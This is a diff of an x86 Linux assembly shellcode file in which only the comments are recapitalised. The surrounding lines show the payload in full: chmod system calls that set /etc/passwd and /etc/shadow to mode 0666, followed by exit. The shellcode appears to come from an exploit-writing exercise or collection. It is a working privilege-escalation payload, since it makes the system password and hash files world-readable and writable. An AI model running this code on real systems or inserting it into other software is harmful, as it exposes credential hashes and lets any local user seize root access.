@@ -9,11 +9,11 @@ _start:
     push 0x61702f2f
     push 0x6374652f     ;Push "/etc//passwd%00" on the stack
     mov ebx, esp        ;Initialize ebx to the esp stack pointer
-    mov al, 0xf         ;move the systemcall number inside eax
+    mov al, 0xf         ;Move the systemcall number inside eax
 
     ;Systemcall details:
     ; --> chmod("/etc/passwd%00", 0666o)
-    int 0x80            ;execute systemcall
+    int 0x80            ;Execute systemcall
 
     xor eax, eax        ;Initialize eax to NULL
     push eax            ;Push a NULL byte on the stack 
@@ -21,17 +21,17 @@ _start:
     push 0x68732f2f
     push 0x6374652f     ;Push "/etc//shadow%00" on the stack
     mov ebx, esp        ;Initialize ebx to the esp stack pointer
-    mov al, 0xf         ;move the systemcall number inside eax
+    mov al, 0xf         ;Move the systemcall number inside eax
 
 
     ;Systemcall details:
     ; --> chmod("/etc/shadow%00", 0666o)
-    int 0x80            ;execute systemcall
+    int 0x80            ;Execute systemcall
 
 
     xor eax, eax        ;Initialize eax to NULL
     xor ebx, ebx        ;Initialize eax to NULL
-    inc eax             ;move the systemcall number inside eax
+    inc eax             ;Move the systemcall number inside eax
     ;Systemcall details:
     ; --> exit(0)
-    int 0x80            ;execute systemcall
+    int 0x80            ;Execute systemcall
